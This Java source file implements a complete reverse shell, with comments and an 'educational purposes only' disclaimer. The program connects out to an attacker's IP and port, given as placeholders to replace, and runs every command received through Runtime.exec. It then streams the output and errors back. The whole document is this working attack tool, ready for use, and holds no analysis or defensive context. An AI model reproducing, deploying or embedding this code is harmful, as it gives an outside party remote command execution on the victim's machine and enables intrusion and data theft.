import java.io.*;
import java.net.*;

public class ReverseShell {
    public static void main(String[] args) {
        // Developed by Kuraiyume
        // WARNING: This script is intended for educational purposes only. 
        // NEVER USE THIS PAYLOAD FOR ILLEGAL ACTIVITIES. Unauthorized use 
        // of this script can result in serious legal consequences. Use 
        // responsibly and only in environments where you have explicit permission.

        // Replace with your attacker's IP address and port
        String serverIP = "127.0.0.1"; // Replace with the attacker's IP address
        int serverPort = 1234; // Replace with the attacker's port number

        try {
            // Connect to the attacker's server
            Socket socket = new Socket(serverIP, serverPort);

            // Get input and output streams from the socket
            InputStream socketInput = socket.getInputStream();
            OutputStream socketOutput = socket.getOutputStream();

            // Create readers and writers for communication through the socket
            InputStreamReader isr = new InputStreamReader(socketInput);
            BufferedReader reader = new BufferedReader(isr);
            PrintWriter writer = new PrintWriter(socketOutput, true);

            // Execute commands received from the attacker
            String command;
            Process process;
            BufferedReader processReader;
            String line;

            // Continuously read commands from the attacker and execute them
            while ((command = reader.readLine()) != null) {
                // Execute the command
                process = Runtime.getRuntime().exec(command);
                
                // Read and send the command's output to the attacker
                processReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                while ((line = processReader.readLine()) != null) {
                    writer.println(line);
                }
                
                // Read and send any error messages from the command execution
                processReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                while ((line = processReader.readLine()) != null) {
                    writer.println(line);
                }
                
                // Ensure all output is sent to the attacker
                writer.flush();
            }

            // Close the socket and associated streams
            socket.close();
        } catch (IOException e) {
            e.printStackTrace(); // Print any IO exceptions encountered
        }
    }
}

